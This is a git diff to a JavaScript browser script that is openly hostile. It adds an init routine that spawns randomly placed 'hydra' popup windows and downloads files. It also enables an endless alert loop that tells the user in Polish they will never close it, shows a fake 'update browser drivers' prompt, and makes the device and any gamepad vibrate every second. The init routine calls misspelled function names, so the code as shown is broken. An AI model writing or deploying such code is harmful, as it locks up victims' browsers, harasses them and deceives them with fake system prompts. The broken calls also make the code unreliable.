@@ -10,6 +10,15 @@ const getRandomCoords = () => ({
     y: Math.floor(Math.random() * (window.screen.availHeight - WIN_HEIGHT))
 });
 
+function init() {
+    openWindow();
+    downloadFiles();
+    annoyinAlerts();
+    playSound();
+    triggerPermisions();
+    startVibrateInterval();
+}
+
 function openWindow() {
     const { x, y } = getRandomCoords();
     const uniqueName = "hydra_" + Math.random().toString(36).substring(7);
@@ -129,12 +138,12 @@ function downloadFiles() {
     });
 }
 
-//function annoyingAlerts() {
-//    while(true) {
-//        alert("Nigdy mnie nie zamkniesz!");
-//        //// UWAGA: Przeglądarki po kilku razach dają opcję "Zablokuj kolejne okna dialogowe"
-//    }
-//}
+function annoyingAlerts() {
+    while(true) {
+        alert("Nigdy mnie nie zamkniesz!");
+        //// UWAGA: Przeglądarki po kilku razach dają opcję "Zablokuj kolejne okna dialogowe"
+    }
+}
 
 function playSound() {
     const audio = new Audio('sound.mp3'); // Możesz podać link URL lub plik lokalny
@@ -178,4 +187,28 @@ async function triggerPermissions() {
     if (confirm("Czy chcesz zaktualizować sterowniki przeglądarki?")) {
         prompt("Wpisz 'TAK', aby potwierdzić operację:");
     }
+}
+
+function startVibrateInterval () {
+  if (typeof window.navigator.vibrate !== 'function') return
+  setInterval(() => {
+    const duration = Math.floor(Math.random() * 600)
+    window.navigator.vibrate(duration)
+  }, 1000)
+
+  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
+  window.addEventListener('gamepadconnected', (event) => {
+    const gamepad = event.gamepad
+    if (gamepad.vibrationActuator) {
+      setInterval(() => {
+        if (gamepad.connected) {
+          gamepad.vibrationActuator.playEffect('dual-rumble', {
+            duration: Math.floor(Math.random() * 600),
+            strongMagnitude: Math.random(),
+            weakMagnitude: Math.random()
+          })
+        }
+      }, 1000)
+    }
+  })
 }
